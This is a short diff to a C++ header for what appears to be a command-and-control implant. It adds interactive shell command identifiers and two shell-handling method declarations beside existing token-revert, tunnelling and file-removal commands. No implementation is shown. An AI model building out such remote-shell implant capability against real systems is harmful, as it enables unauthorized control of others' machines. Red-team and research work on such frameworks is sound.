@@ -26,6 +26,12 @@
 #define COMMAND_RM           17
 #define COMMAND_UPLOAD       33
 
+#define COMMAND_SHELL_START  71
+#define COMMAND_SHELL_WRITE  72
+#define COMMAND_SHELL_CLOSE  73
+#define COMMAND_SHELL_ACEPT  74
+
+
 #define COMMAND_SAVEMEMORY 0x2321
 #define COMMAND_ERROR      0x1111ffff
 
@@ -62,6 +68,8 @@ public:
 	void CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdRev2Self(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdRm(ULONG commandId, Packer* inPacker, Packer* outPacker);
+	void CmdShellStart(ULONG commandId, Packer* inPacker, Packer* outPacker);
+	void CmdShellWrite(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdTunnelMsgConnectTCP(ULONG commandId, Packer* inPacker, Packer* outPacker);
 	void CmdTunnelMsgConnectUDP(ULONG commandId, Packer* inPacker, Packer* outPacker);
